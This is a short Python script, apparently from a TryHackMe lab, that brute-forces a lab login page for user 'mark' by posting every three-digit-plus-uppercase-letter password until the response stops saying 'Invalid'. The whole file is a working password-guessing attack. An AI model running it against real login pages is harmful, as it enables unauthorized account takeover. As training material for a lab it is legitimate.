# This script tries to find a password for a login page using brute force.
# It was made based on the "Custom tooling using python" lesson from tryhackme.com.
# It tests 3-digit passwords with an uppercase letter for the username "mark".

import requests  # Used to send HTTP requests.

url = "http://python.thm/labs/lab1/index.php"  # The target login page URL.

username = "mark"  # The username to test.

# Creating a list of passwords with 3 digits (000-999) followed by A-Z letters.
password_list = [f"{str(i).zfill(3)}{chr(j)}" for i in range(1000) for j in range(65, 91)]

def brute_force():  # Function to run the brute-force attack.
    for password in password_list:  # Try each password.
        data = {"username": username, "password": password}  # Data for the login attempt.
        response = requests.post(url, data=data)  # Send the request.
        
        if "Invalid" not in response.text:  # Check if login works.
            print(f"[+] Found valid credentials: {username}:{password}")  # Show if successful.
            break  # Stop if we find the right one.
        else:
            print(f"[-] Attempted: {password}")  # Show the tried password.

brute_force()  # Start the attack.